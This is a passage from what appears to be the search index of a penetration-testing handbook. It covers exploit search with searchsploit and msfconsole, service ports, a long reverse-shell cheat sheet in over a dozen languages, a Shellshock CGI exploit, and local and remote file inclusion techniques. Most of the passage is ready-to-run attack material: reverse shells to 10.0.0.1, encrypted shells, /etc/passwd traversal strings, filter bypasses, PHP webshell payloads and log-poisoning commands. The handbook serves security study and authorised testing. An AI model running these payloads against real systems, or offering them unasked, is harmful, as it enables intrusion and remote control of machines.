copy the exploit the current directory.\nFor more examples, see the manual.\nsearchsploit afd windows local searchsploit -m 39446   Parameters   -u: Check for and install any exploitdb package updates. -m: Copies an exploit to the current working directory. --nmap \u0026lt;xml file\u0026gt;: Checks all results in Nmap\u0026rsquo;s XML output with service version.   MSFConsole 2 For more options, see the manual.\nmsf\u0026gt; search cve:2011 port:135 platform:windows target:XP   Search Keywords   app: Modules that are client or server attacks author: Modules written by this author bid: Modules with a matching Bugtraq ID cve: Modules with a matching CVE ID edb: Modules with a matching Exploit-DB ID name: Modules with a matching descriptive name platform: Modules affecting this platform ref: Modules with a matching ref type: Modules of a specific type (exploit, auxiliary, or post)   Online  Google: \u0026lt;service\u0026gt; \u0026lt;version\u0026gt; exploit Exploit Database Rapid7 Vulnerability \u0026amp; Exploit Database  Vulners Database Sploitus Shodan Exploits PacketStorm    “Exploit Database SearchSploit Manual.” Exploit Database - Exploits for Penetration Testers, Researchers, and Ethical Hackers, https://www.exploit-db.com/searchsploit. \u0026#x21a9;\u0026#xfe0e;\n “Msfconsole - Metasploit Unleashed.” Infosec Training and Penetration Testing | Offensive Security, https://www.offensive-security.com/metasploit-unleashed/msfconsole/. \u0026#x21a9;\u0026#xfe0e;\n   "});index.add({'id':13,'href':'/book/services/','title':"Services",'section':"",'content':"Service Enumeration    Ports Service Description     21 FTP File Transfer Protocol   25 / 465 / 587 SMTP/S Simple Mail Transfer Protocol   53 DNS Domain Name Systems   80 / 443 HTTP/S Hypertext Transfer Protocol   110 / 995 POP/S Post Office Protocol   139 / 445 SMB Server Message Block   143 / 993 IMAP Internet Message Access Protocol    "});index.add({'id':15,'href':'/book/reverse-shells/','title':"Reverse Shells",'section':"",'content':"Reverse Shells After the exploitation of a remote code execution (RCE) vulnerability, the next step will be to interact with the compromised target. Reverse shells, as opposed to bind shells, initiate the connection from the remote host to the local host. They are especially handy and, sometimes the only way, to get remote access across a NAT or firewall.\nThe chosen shell will depend on the binaries installed on the target system, although uploading a binary can be possible.12\nUnencrypted Shells Netcat Listener To get the connection from the remote machine (10.0.0.3) and interact with it, a listener have to be set on the desired port (1234) on the local machine (10.0.0.1).\nsudo nc -nvlp 1234   Parameters   n: don\u0026rsquo;t do DNS lookups. v: prints status messages. l: listen. p \u0026lt;port\u0026gt;: local port used for listening.   Use a port that is likely allowed via outbound firewall rules on the target network.\nPorts from 1 to 1023 are by default privileged ports. To bind to a privileged port, a process must be running with root permissions.\n Bash bash -i \u0026gt;\u0026amp; /dev/tcp/10.0.0.1/1234 0\u0026gt;\u0026amp;1 0\u0026lt;\u0026amp;196;exec 196\u0026lt;\u0026gt;/dev/tcp/10.0.0.1/1234; sh \u0026lt;\u0026amp;196 \u0026gt;\u0026amp;196 2\u0026gt;\u0026amp;196 Awk awk \u0026#39;BEGIN {s = \u0026#34;/inet/tcp/0/10.0.0.1/1234\u0026#34;; while(42) { do{ printf \u0026#34;shell\u0026gt;\u0026#34; |\u0026amp; s; s |\u0026amp; getline c; if(c){ while ((c |\u0026amp; getline) \u0026gt; 0) print $0 |\u0026amp; s; close(c); } } while(c != \u0026#34;exit\u0026#34;) close(s); }}\u0026#39; /dev/null Gawk #!/usr/bin/gawk -f BEGIN { Service = \u0026#34;/inet/tcp/0/10.0.0.1/1234\u0026#34; while (1) { do { printf \u0026#34;0xffsec\u0026gt;\u0026#34; |\u0026amp; Service Service |\u0026amp; getline cmd if (cmd) { while ((cmd |\u0026amp; getline) \u0026gt; 0) print $0 |\u0026amp; Service close(cmd) } } while (cmd != \u0026#34;exit\u0026#34;) close(Service) } } PERL perl -e \u0026#39;use Socket;$i=\u0026#34;10.0.0.1\u0026#34;;$p=1234;socket(S,PF_INET,SOCK_STREAM,getprotobyname(\u0026#34;tcp\u0026#34;));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,\u0026#34;\u0026gt;\u0026amp;S\u0026#34;);open(STDOUT,\u0026#34;\u0026gt;\u0026amp;S\u0026#34;);open(STDERR,\u0026#34;\u0026gt;\u0026amp;S\u0026#34;);exec(\u0026#34;/bin/sh -i\u0026#34;);};\u0026#39; PERL Windows perl -MIO -e \u0026#39;$c=new IO::Socket::INET(PeerAddr,\u0026#34;10.0.0.1:1234\u0026#34;);STDIN-\u0026gt;fdopen($c,r);$~-\u0026gt;fdopen($c,w);system$_ while\u0026lt;\u0026gt;;\u0026#39; Python python -c \u0026#39;import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\u0026#34;10.0.0.1\u0026#34;,1234));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\u0026#34;/bin/sh\u0026#34;,\u0026#34;-i\u0026#34;]);\u0026#39; Python Windows C:\\Python27\\python.exe -c \u0026#34;(lambda __y, __g, __contextlib: [[[[[[[(s.connect((\u0026#39;10.0.0.1\u0026#39;, 1234)), [[[(s2p_thread.start(), [[(p2s_thread.start(), (lambda __out: (lambda __ctx: [__ctx.__enter__(), __ctx.__exit__(None, None, None), __out[0](lambda: None)][2])(__contextlib.nested(type(\u0026#39;except\u0026#39;, (), {\u0026#39;__enter__\u0026#39;: lambda self: None, \u0026#39;__exit__\u0026#39;: lambda __self, __exctype, __value, __traceback: __exctype is not None and (issubclass(__exctype, KeyboardInterrupt) and [True for __out[0] in [((s.close(), lambda after: after())[1])]][0])})(), type(\u0026#39;try\u0026#39;, (), {\u0026#39;__enter__\u0026#39;: lambda self: None, \u0026#39;__exit__\u0026#39;: lambda __self, __exctype, __value, __traceback: [False for __out[0] in [((p.wait(), (lambda __after: __after()))[1])]][0]})())))([None]))[1] for p2s_thread.daemon in [(True)]][0] for __g[\u0026#39;p2s_thread\u0026#39;] in [(threading.Thread(target=p2s, args=[s, p]))]][0])[1] for s2p_thread.daemon in [(True)]][0] for __g[\u0026#39;s2p_thread\u0026#39;] in [(threading.Thread(target=s2p, args=[s, p]))]][0] for __g[\u0026#39;p\u0026#39;] in [(subprocess.Popen([\u0026#39;\\\\windows\\\\system32\\\\cmd.exe\u0026#39;], stdout=subprocess.PIPE, stderr=subprocess.STDOUT, stdin=subprocess.PIPE))]][0])[1] for __g[\u0026#39;s\u0026#39;] in [(socket.socket(socket.AF_INET, socket.SOCK_STREAM))]][0] for __g[\u0026#39;p2s\u0026#39;], p2s.__name__ in [(lambda s, p: (lambda __l: [(lambda __after: __y(lambda __this: lambda: (__l[\u0026#39;s\u0026#39;].send(__l[\u0026#39;p\u0026#39;].stdout.read(1)), __this())[1] if True else __after())())(lambda: None) for __l[\u0026#39;s\u0026#39;], __l[\u0026#39;p\u0026#39;] in [(s, p)]][0])({}), \u0026#39;p2s\u0026#39;)]][0] for __g[\u0026#39;s2p\u0026#39;], s2p.__name__ in [(lambda s, p: (lambda __l: [(lambda __after: __y(lambda __this: lambda: [(lambda __after: (__l[\u0026#39;p\u0026#39;].stdin.write(__l[\u0026#39;data\u0026#39;]), __after())[1] if (len(__l[\u0026#39;data\u0026#39;]) \u0026gt; 0) else __after())(lambda: __this()) for __l[\u0026#39;data\u0026#39;] in [(__l[\u0026#39;s\u0026#39;].recv(1024))]][0] if True else __after())())(lambda: None) for __l[\u0026#39;s\u0026#39;], __l[\u0026#39;p\u0026#39;] in [(s, p)]][0])({}), \u0026#39;s2p\u0026#39;)]][0] for __g[\u0026#39;os\u0026#39;] in [(__import__(\u0026#39;os\u0026#39;, __g, __g))]][0] for __g[\u0026#39;socket\u0026#39;] in [(__import__(\u0026#39;socket\u0026#39;, __g, __g))]][0] for __g[\u0026#39;subprocess\u0026#39;] in [(__import__(\u0026#39;subprocess\u0026#39;, __g, __g))]][0] for __g[\u0026#39;threading\u0026#39;] in [(__import__(\u0026#39;threading\u0026#39;, __g, __g))]][0])((lambda f: (lambda x: x(x))(lambda y: f(lambda: y(y)()))), globals(), __import__(\u0026#39;contextlib\u0026#39;))\u0026#34; PHP php -r \u0026#39;$sock=fsockopen(\u0026#34;10.0.0.1\u0026#34;,1234);exec(\u0026#34;/bin/sh -i \u0026lt;\u0026amp;3 \u0026gt;\u0026amp;3 2\u0026gt;\u0026amp;3\u0026#34;);\u0026#39; php -r \u0026#39;$sock=fsockopen(\u0026#34;10.0.0.1\u0026#34;,1234);$proc=proc_open(\u0026#34;/bin/sh -i\u0026#34;, array(0=\u0026gt;$sock, 1=\u0026gt;$sock, 2=\u0026gt;$sock),$pipes);\u0026#39; Ruby ruby -rsocket -e \u0026#39;exit if fork;c=TCPSocket.new(\u0026#34;10.0.0.1\u0026#34;,\u0026#34;1234\u0026#34;);while(cmd=c.gets);IO.popen(cmd,\u0026#34;r\u0026#34;){|io|c.print io.read}end\u0026#39; ruby -rsocket -e\u0026#39;f=TCPSocket.open(\u0026#34;10.0.0.1\u0026#34;,1234).to_i;exec sprintf(\u0026#34;/bin/sh -i \u0026lt;\u0026amp;%d \u0026gt;\u0026amp;%d 2\u0026gt;\u0026amp;%d\u0026#34;,f,f,f)\u0026#39; Ruby Windows ruby -rsocket -e \u0026#39;c=TCPSocket.new(\u0026#34;10.0.0.1\u0026#34;,\u0026#34;1234\u0026#34;);while(cmd=c.gets);IO.popen(cmd,\u0026#34;r\u0026#34;){|io|c.print io.read}end\u0026#39; Golang echo \u0026#39;package main;import\u0026#34;os/exec\u0026#34;;import\u0026#34;net\u0026#34;;func main(){c,_:=net.Dial(\u0026#34;tcp\u0026#34;,\u0026#34;10.0.0.1:1234\u0026#34;);cmd:=exec.Command(\u0026#34;/bin/sh\u0026#34;);cmd.Stdin=c;cmd.Stdout=c;cmd.Stderr=c;cmd.Run()}\u0026#39; \u0026gt; /tmp/t.go \u0026amp;\u0026amp; go run /tmp/t.go \u0026amp;\u0026amp; rm /tmp/t.go Java r = Runtime.getRuntime() p = r.exec([\u0026#34;/bin/bash\u0026#34;,\u0026#34;-c\u0026#34;,\u0026#34;exec 5\u0026lt;\u0026gt;/dev/tcp/10.0.0.1/1234;cat \u0026lt;\u0026amp;5 | while read line; do \\$line 2\u0026gt;\u0026amp;5 \u0026gt;\u0026amp;5; done\u0026#34;] as String[]) p.waitFor() Groovy 3 String host=\u0026#34;10.0.0.1\u0026#34;; int port=1234; String cmd=\u0026#34;cmd.exe\u0026#34;; Process p=new ProcessBuilder(cmd).redirectErrorStream(true).start();Socket s=new Socket(host,port);InputStream pi=p.getInputStream(),pe=p.getErrorStream(), si=s.getInputStream();OutputStream po=p.getOutputStream(),so=s.getOutputStream();while(!s.isClosed()){while(pi.available()\u0026gt;0)so.write(pi.read());while(pe.available()\u0026gt;0)so.write(pe.read());while(si.available()\u0026gt;0)po.write(si.read());so.flush();po.flush();Thread.sleep(50);try {p.exitValue();break;}catch (Exception e){}};p.destroy();s.close(); Java reverse shell also works for Groovy.  Lua lua -e \u0026#34;require(\u0026#39;socket\u0026#39;);require(\u0026#39;os\u0026#39;);t=socket.tcp();t:connect(\u0026#39;10.0.0.1\u0026#39;,\u0026#39;1234\u0026#39;);os.execute(\u0026#39;/bin/sh -i \u0026lt;\u0026amp;3 \u0026gt;\u0026amp;3 2\u0026gt;\u0026amp;3\u0026#39;);\u0026#34; Lua Windows lua5.1 -e \u0026#39;local host, port = \u0026#34;10.0.0.1\u0026#34;, 1234 local socket = require(\u0026#34;socket\u0026#34;) local tcp = socket.tcp() local io = require(\u0026#34;io\u0026#34;) tcp:connect(host, port); while true do local cmd, status, partial = tcp:receive() local f = io.popen(cmd, \u0026#34;r\u0026#34;) local s = f:read(\u0026#34;*a\u0026#34;) f:close() tcp:send(s) if status == \u0026#34;closed\u0026#34; then break end end tcp:close()\u0026#39; NodeJS (function(){ var net = require(\u0026#34;net\u0026#34;), cp = require(\u0026#34;child_process\u0026#34;), sh = cp.spawn(\u0026#34;/bin/sh\u0026#34;, []); var client = new net.Socket(); client.connect(1234, \u0026#34;10.0.0.1\u0026#34;, function(){ client.pipe(sh.stdin); sh.stdout.pipe(client); sh.stderr.pipe(client); }); return /a/; // Prevents the Node.js application form crashing })(); require(\u0026#39;child_process\u0026#39;).exec(\u0026#39;nc -e /bin/sh 10.0.0.1 1234\u0026#39;) -var x = global.process.mainModule.require -x(\u0026#39;child_process\u0026#39;).exec(\u0026#39;nc 10.0.0.1 1234 -e /bin/bash\u0026#39;) Netcat nc -e /bin/sh 10.0.0.1 1234 Depending on the Netcat version, the -e option may not be available, but you still can execute a command after connection being established by redirecting file descriptors. A FIFO or named pipe can be created locally so when a connection is established, /bin/sh gets executed and the shell prompt is given to the remote machine.4\nrm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2\u0026gt;\u0026amp;1|nc 10.0.0.1 1234 \u0026gt;/tmp/f Netcat Windows nc.exe 10.0.0.1 1234 -e cmd.exe Telnet rm -f /tmp/f; mknod /tmp/f p \u0026amp;\u0026amp; telnet 10.0.0.1 1234 0/tmp/p A FIFO can be create both with mknod \u0026lt;path\u0026gt; p or mkfifo \u0026lt;path\u0026gt; .  Encrypted Shells During an engagement is imperative to encrypt the communication between the target and the attacker to protect sensitive data and from further activity analysis.\nAlthough most of the tools listed below do not support certificate pinning, meaning they won\u0026rsquo;t protect you against a MITM attack, they can significantly reduce the risk of sniffing and IDS detection. 5\nOpenSSL 6 Before starting the listener, a key pair and a certificate must be generated.\nopenssl req -x509 -newkey rsa:4096 -keyout key.pem -out cert.pem -days 365 -nodes   Parameters   req: certificate request and certificate generating utility. -x509: output a x590 structure instead of a certificate request. -newkey \u0026lt;type:bits\u0026gt;: specify as type:bits. -keyout \u0026lt;file\u0026gt;: send key to \u0026lt;file\u0026gt;. -out: output file. -days \u0026lt;int\u0026gt;: number of days cert is valid for. -nodes: don\u0026rsquo;t encrypt the output key.   Listener openssl s_server -key key.pem -cert cert.pem -port 1234   Parameters   s_server: generic SSL/TLS server which listens for connections on a given port using SSL/TLS. -key \u0026lt;key\u0026gt;: private Key if not in -cert; default is server.pem. -cert \u0026lt;cert\u0026gt;: certificate file to use; default is server.pem. -port \u0026lt;port\u0026gt;: TCP/IP port to listen on for connections (default: 4433).   Reverse Shell mkfifo /tmp/s; /bin/sh -i \u0026lt; /tmp/s 2\u0026gt;\u0026amp;1 | openssl s_client -connect 10.0.0.1:1234 \u0026gt; /tmp/s 2\u0026gt; /dev/null; rm /tmp/s   Parameters   s_client: generic SSL/TLS client which connects to a remote host using SSL/TLS. -connect: TCP/IP where to connect (default: 4433).   Ncat 7 Listener ncat -nvlp 1234 --ssl Reverse Shell ncat -nv 10.0.0.1 1234 -e /bin/bash --ssl   Parameters   -n: do not resolve hostnames via DNS. -v: verbose mode. -l: bind and listen for incoming connections. -p \u0026lt;port\u0026gt;: specify source port to use. -e \u0026lt;command\u0026gt;: executes the given command.   Upgrade Shells More often than not, reverse, or bind shells are shells with limited interactive capabilities. Meaning no job control, no auto-completion, no STDERR output, and, most important, poor signal handling and limited commands support. To fully leverage the shell it is convenient to upgrade to an interactive TTY with extended features.\nTo check if the shell is a TTY shell use the tty command.  Shell to Bash Upgrade from shell to bash.\nSHELL=/bin/bash script -q /dev/null Python PTY Module 8 Spawn /bin/bash using Python\u0026rsquo;s PTY module, and connect the controlling shell with its standard I/O.\npython -c \u0026#39;import pty; pty.spawn(\u0026#34;/bin/bash\u0026#34;)\u0026#39; Fully Interactive TTY Background the current remote shell (^Z), update the local terminal line settings with stty9 and bring the remote shell back.\nstty raw -echo \u0026amp;\u0026amp; fg After bringing the job back the cursor will be pushed to the left. Reinitialize the terminal with reset.\n  “Reverse Shell Cheat Sheet | Pentestmonkey.” Pentestmonkey | Taking the Monkey Work out of Pentesting, http://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet. \u0026#x21a9;\u0026#xfe0e;\n swisskyrepo. “PayloadsAllTheThings/Reverse Shell Cheatsheet.Md at Master · Swisskyrepo/PayloadsAllTheThings · GitHub.” GitHub, https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md. \u0026#x21a9;\u0026#xfe0e;\n Frohoff, Chris. “Pure Groovy/Java Reverse Shell .” Gist · GitHub, 262588213843476, https://gist.github.com/frohoff/fed1ffaab9b9beeb1c76. \u0026#x21a9;\u0026#xfe0e;\n “Nc.Openbsd.” Man Pages Archive - Manned.Org, https://manned.org/nc.openbsd/6f0a5cf9. \u0026#x21a9;\u0026#xfe0e;\n “Certificate and Public Key Pinning Control.” OWASP Foundation | Open Source Foundation for Application Security, https://owasp.org/www-community/controls/Certificate_and_Public_Key_Pinning. \u0026#x21a9;\u0026#xfe0e;\n OpenSSL Foundation, Inc. “/Docs/Manmaster/Man1/Openssl.Html.” OpenSSL.Org, https://www.openssl.org/docs/manmaster/man1/openssl.html. \u0026#x21a9;\u0026#xfe0e;\n “Ncat Users’ Guide.” Nmap: The Network Mapper - Free Security Scanner, https://nmap.org/ncat/guide/index.html. \u0026#x21a9;\u0026#xfe0e;\n “Pty — Pseudo-Terminal Utilities.” 3.8.3 Documentation, https://docs.python.org/3/library/pty.html. \u0026#x21a9;\u0026#xfe0e;\n “Stty.” Linux Manual Page, https://man7.org/linux/man-pages/man1/stty.1.html. \u0026#x21a9;\u0026#xfe0e;\n   "});index.add({'id':16,'href':'/book/notes/','title':"Notes",'section':"",'content':"Notes "});index.add({'id':17,'href':'/book/web-applications/cgi/','title':"CGI",'section':"Web Applications",'content':"Common Gateway Interface Common Gateway Interface (CGI) is an interface specification for web servers to execute command-line interface (CLI) programs. These programs also known as CGI scripts or simply CGIs, are commonly executed at the time a request is made and return dynamically generated HTML content.\nMost servers expect CGI scripts to reside in a special directory, usually called cgi-bin, to handle the requests correctly and execute the program instead of returning the file content. 1\nShellshock Shellshock (CVE-2014-6271) is an Arbitrary Code Execution (ACE) vulnerability that affects Linux and Unix command-line shell, aka the GNU Bourne Again Shell.\nGNU Bourne Again Shell, or Bash, is an interpreter that allows users to send commands on Unix and Linux systems, typically by connecting over SSH or Telnet but it can also operate as a parser for CGI scripts.\nIn addition to CGI-based web servers, it also affects OpenSSH servers, DHCP clients, Qmail servers and restricted shells of the IBM Hardware Management Console (IBM HMC)  The vulnerability occurs when the variables sent to the server, are passed and interpreted by Bash. This variable involves a specially crafted environment variable containing an exported function definition, followed by arbitrary commands. Bash incorrectly executes the trailing commands when it imports the function.\nEnvironment variable with function definition Expected command + + | | +--------+--------+ +----------------+ +------------+--------------+ | env x='() { :;};| |echo vulnerable'| |bash -c \u0026quot;echo Real command\u0026quot;| +-----------------+ +-------+--------+ +---------------------------+ | + Arbitrary command executed by Bash Test Reflected curl -fs -H \u0026#34;user-agent: () { :; }; echo; echo \u0026#39;vulnerable\u0026#39;\u0026#34; http://10.0.0.3/cgi-bin/vulnerable | grep vulnerable Blind curl -fs -H \u0026#34;user-agent: () { :; }; /bin/bash -c \u0026#39;sleep 5\u0026#39;\u0026#34; http://10.0.0.3/cgi-bin/vulnerable   Parameters   -f: fail silently on HTTP errors. -s: silent mode. -H: pass custom header(s) to server.   Exploit curl -fs -H \u0026#34;user-agent: () { :; }; /bin/bash -i \u0026gt;\u0026amp; /dev/tcp/10.0.0.1/1234 0\u0026gt;\u0026amp;1\u0026#34; http://10.0.0.3/cgi-bin/vulnerable Further Reading  Inside Shellshock: How hackers are using it to exploit systems Wikipedia - Shellshock (software bug)    Gundavaram, Shishir. “The Common Gateway Interface (CGI).” O’Reilly Media - Technology and Business Training, O’Reilly \u0026amp; Associates, Inc., https://www.oreilly.com/openbook/cgi/ch01_01.html. \u0026#x21a9;\u0026#xfe0e;\n   "});index.add({'id':18,'href':'/book/web-applications/file-inclusion-and-path-traversal/','title':"File Inclusion",'section':"Web Applications",'content':"File Inclusion and Path Traversal File Inclusion File inclusion is the method for applications, and scripts, to include local or remote files during run-time. The vulnerability occurs when an application generates a path to executable code using an attacker-controlled variable, giving the attacker control over which file is executed.\nThere are two different types. Local File Inclusion (LFI) where the application includes files on the current server. And Remote File Inclusion (RFI) where the application downloads and execute files from a remote server. 1\nPath Traversal A path, or directory, traversal attack consists of exploiting weak validation, or sanitization, of user-supplied data allowing the attacker to read files, or directories, outside the context of the current application.\nThe use of these techniques may lead to information disclosure, cross-site-Scripting (XSS), and remote code execution (RCE).2\nLFI Basic LFI Absolute Path Traversal http://example.com/index.php?page=/etc/passwd Relative Path Traversal http://example.com/index.php?page=../../../etc/passwd Null Byte Sometimes applications append extra characters, like file extensions, to the input variable. A null byte will make the application ignore the following characters.\nhttp://example.com/index.php?page=../../../etc/passwd%00 PHP fixed the issue in version 5.3.4. https://bugs.php.net/bug.php?id=39863  Dot Truncation In PHP, filenames longer than 4096 bytes will be truncated and, characters after that, ignored.\nhttp://example.com/index.php?page=../../../etc/passwd................[ADD MORE] http://example.com/index.php?page=../../../etc/passwd\\.\\.\\.\\.\\.\\.\\.\\.[ADD MORE] http://example.com/index.php?page=../../../etc/passwd/./././././././.[ADD MORE] http://example.com/index.php?page=../../../[ADD MORE]../../../../../etc/passwd In PHP: /etc/passwd = /etc//passwd = /etc/./passwd = /etc/passwd/ = /etc/passwd/  Encoding Manipulating variables that reference files with “dot-dot-slash\u0026rdquo; (../) sequences and its variations, or using absolute file paths, may allow bypassing poorly implemented input filtering. 3\n    URL Double URL UTF-8 Unicode 16 bits Unicode     . %2e %252e %c0%2e %e0%40%ae %c0%ae %u002e   / %2f %252f %c0%2f %e0%80%af %c0%af %u2215   \\ | %2c | %252c | %c0%5c %c0%80%5c |%u2216 |        Encoded ../ %2e%2e%2f %252e%252e%252f %c0%ae%c0%ae%c0%af %uff0e%uff0e%u2215 Encoded ..\\ %2e%2e%2c %252e%252e%252c %c0%ae%c0%ae%c0%af %uff0e%uff0e%u2216 Double URL Encoding http://example.com/index.php?page=%252e%252e%252fetc%252fpasswd UTF-8 Encoding http://example.com/index.php?page=%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/etc/passwd Bypass Filtering http://example.com/index.php?page=....//....//etc/passwd http://example.com/index.php?page=..///////..////..//////etc/passwd http://example.com/index.php?page=/%5C../%5C../%5C../%5C../%5C../%5C../%5C../%5C../%5C../%5C../%5C../etc/passwd Bypass ../ removal ..././ ...\\.\\ Bypass ../ replaced with ; ..;/ http://example.com/page.jsp?include=..;/..;/sensitive.txt Windows UNC Share 4 Windows UNC shares can be injected to redirect access to other resources.\n\\\\localhost\\c$\\windows\\win.ini RFI Most filter bypassing techniques for LFI can be used for RFI.\nBasic RFI http://example.com/index.php?page=http://example.evil/shell.txt Null Byte http://example.com/index.php?page=http://example.evil/shell.txt%00 Bypass http(s):// removal hhttp://thttp://thttp://phttp://:http://http:///http:/// hhttps://thttps://thttps://phttps://shttps://:https:///https:///https:// Bypass allow_url_include On Windows, it is possible to bypass disabled allow_url_include and allow_url_fopen by using SMB. Simply including a script located in an open share.\nhttp://example.com/index.php?page=\\\\10.0.0.1\\share\\shell.php PHP Stream Wrappers PHP provides many built-in wrappers for various protocols, to use with file functions such as fopen, copy, file_exists, and filezise. 5\nphp://filter php://filter is a kind of meta-wrapper that allows filtering a stream before the content is read. The resulting data is the encoded version of the given file\u0026rsquo;s source code.\nMultiple filter chains can be specified on one path, chained using | or /.  Filter string.rot13. http://example.com/index.php?page=php://filter/read=string.rot13/resource=index.php Filter convert.base64. http://example.com/index.php?page=php://filter/convert.iconv.utf-8.utf-16/resource=index.php http://example.com/index.php?page=php://filter/convert.base64-encode/resource=index.php Filter chaining zlib.deflate and convert.base64. http://example.com/index.php?page=php://filter/zlib.deflate/convert.base64-encode/resource=/etc/passwd Base64 decode and gzip inflate. The resulting encoded string can be decoded and inflated by piping it into the following PHP script:\necho [BASE64-STR] | php -r \u0026#39;echo gzinflate(base64_decode(file_get_contents(\u0026#34;php://stdin\u0026#34;)));\u0026#39; zip:// zip:// is a wrapper for zip compression streams. To leverage the zip functionalities, upload a zipped PHP script to the server (with the preferred extension) and decompress in the server using the zip://\u0026lt;zipfile\u0026gt;#\u0026lt;file\u0026gt;, being \u0026lt;file\u0026gt; the resulting decompressed file.\necho -n \u0026#39;\u0026lt;?php system($_GET[\u0026#39;c\u0026#39;]); ?\u0026gt;\u0026#39; \u0026gt; shell.php zip shell.jpg shell.php http://example.com/index.php?page=zip://shell.jpg%23shell.php data:// data:// is a wrapper for RFC2397, or data:// scheme. The scheme allows the inclusion of small data items as if it had been included externally. 6\nPHP Shell Script.\necho -n \u0026#39;\u0026lt;?php system($_GET[\u0026#39;c\u0026#39;]); ?\u0026gt;\u0026#39; | base64 PD9waHAgc3lzdGVtKCRfR0VUW2NdKTsgPz4= http://example.com/index.php?page=data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUW2NdKTsgPz4=\u0026amp;c=ls expect:// expect:// wrapper provide access to processes\u0026rsquo; stdio, stdout and stderr via PTY.\nhttp://example.com/index.php?page=expect://ls php://input php://input is a read-only stream that allows to read raw data from the request body.\ncurl -X POST --data \u0026#34;\u0026lt;?php echo shell_exec(\u0026#39;ls\u0026#39;); ?\u0026gt;\u0026#34; \u0026#34;http://example.com/index.php?page=php://input%00\u0026#34; -v The proc File System The proc file system (procfs) contains a hierarchy of special files that represent the current state of the kernel. It acts as an interface to internal data structures in the kernel for applications and users.\nBecause of its abstract properties, it is also referred to as a virtual file system.\nFile within this directory are listed as zero bytes in size, even though, can contain a large amount of data. 7\nProcess Directories The /proc directory contains one subdirectory for each process running on the system, which is named after the process ID (PID). Concurrently, each of these directories contains files to store information about the respective process. 8\n/proc/self (/fs/proc/self.c) The /proc/self represents the currently scheduled PID. In other words, a symbolic link to the currently running process\u0026rsquo;s directory.\nIt is a self-referenced device driver, or module, maintained by the Kernel.\nUseful /proc entries  /proc/version: Kernel version. /proc/sched_debug: Scheduling information and running processes per CPU. /proc/mounts: Mounted file systems. /proc/net/arp: ARP table. /proc/net/route: Routing table. proc/net/tcp / udp: TCP or UDP active connections. /proc/net/fib_trie: Routing tables trie.9  Useful /proc/[PID] entries   /proc/[PID]/cmdline Process invocation command with parameters.\nIt potentially exposes paths, usernames and passwords.\n  /proc/[PID]/environ Environment variables.\nIt potentially exposes paths, usernames and passwords.\n  /proc/[PID]/cwd Process\u0026rsquo; current working directory.\n  /proc/[PID]/fd/[#] File descriptors.\nContains one entry for each file which the process has open.\n  LFI2RCE - /proc /proc/self/environ /proc/self/environ contains user inputs that turn it in a useful volatile storage. Apache stores an environment variable for the HTTP_USER_AGENT header to be used by the self-contained modules.10\ncurl \u0026#34;http://example.com/index.php?page=/proc/self/environ\u0026amp;c=id\u0026#34; -H \u0026#34;User-Agent\u0026#34; --data \u0026#34;\u0026lt;?php system($_GET[\u0026#39;c\u0026#39;]); ?\u0026gt;\u0026#34; /proc/[PID]/fd/[FD] 3   Upload A LOT of shells.\n  Include http://example.com/index.php?page=/proc/$PID/fd/$fd.\nBruteforce the process ID ($PID) and file descriptor id ($FD)\n  LFI2RCE - Log Poisoning A log file is a file that contains a record of events from an application. A log poisoning attack consists of triggering one of these events with executable code as part of the logged data, and successively, through LFI, include and execute the code.\nIt is recommended to first load the target log, not only to verify the access but to identify what data is being stored.\nAdministrators can modify the logged data according to their needs.\n Apache By default, Apache maintains access and error logs. The error log, commonly, register the Referer header, while the acccess log, the User-Agent. 11\nAccess Log Make a valid request with the code in the User-Agent header.\ncurl -H \u0026#39;User-Agent\u0026#39; --data \u0026#34;\u0026lt;?php system($_GET[\u0026#39;c\u0026#39;]); ?\u0026gt;\u0026#34; \u0026#34;http://example.com\u0026#34; -v Error Log Make an invalid request, an invalid inclusion for example, with the suitable Referer header.\ncurl -H \u0026#39;Referer\u0026#39; --data \u0026#34;\u0026lt;?php system($_GET[\u0026#39;c\u0026#39;]); ?\u0026gt;\u0026#34; \u0026#34;http://example.com/invalid#req\u0026#34; -v The Apache logging API escapes strings going to the logs.\nUse single quotes (') since double quotes (\u0026quot;) are replaced escaped as \u0026quot;quote\u0026quot;;\n LFI http://example.com/index.php?page=/path/to/access.log\u0026amp;c=id Common Apache Log Paths Log files can also be set to custom locations, either globally, or domain based if virtual hosting is enabled.\n/var/log/httpd/access_log /var/log/httpd/error_log /var/log/apache/access.log /var/log/apache/error.log /var/log/apache2/access.log /var/log/apache2/error.log /usr/local/apache/log/access_log /usr/local/apache/log/error_log /usr/local/apache2/log/access_log /usr/local/apache2/log/error_log /var/log/nginx/access.log /var/log/nginx/error.log SSH SSH logs the username of each connection. Create a connection to SSH with the suitable username.\nssh \u0026#39;\u0026lt;?php system(\u0026#39;id\u0026#39;); ?\u0026gt;\u0026#39;@example.com LFI http://example.com/index.php?page=/path/to/sshd.log\u0026amp;c=id Common SSH Log Paths /var/log/auth.log /var/log/sshd.log Email Email an internal account, containing the script.\nmail -s \u0026#34;\u0026lt;?php system($_GET[\u0026#39;c\u0026#39;]);?\u0026gt;\u0026#34; www-data@10.0.0.3 \u0026lt; /dev/null LFI http://example.com/index.php?page=/var/mail/www-data\u0026amp;c=id Further Reading  OWASP - Testing Directory Traversal File Include BSidesMCR 2018: It\u0026rsquo;s A PHP Unserialization Vulnerability Jim, But Not As We Know It by Sam Thomas PayloadsAllTheThings Intruders    Contributors to Wikimedia projects. “File Inclusion Vulnerability - Wikipedia.” Wikipedia, the Free Encyclopedia, Wikimedia Foundation, Inc., 24 Nov. 2006, https://en.wikipedia.org/wiki/File_inclusion_vulnerability. \u0026#x21a9;\u0026#xfe0e;\n “Path Traversal - OWASP.” OWASP, https://wiki.owasp.org/index.php/Path_Traversal. \u0026#x21a9;\u0026#xfe0e;\n swisskyrepo. “PayloadsAllTheThings / Directory Traversal.” GitHub, https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Directory%20Traversal. \u0026#x21a9;\u0026#xfe0e;\n “CWE-40: Path Traversal: 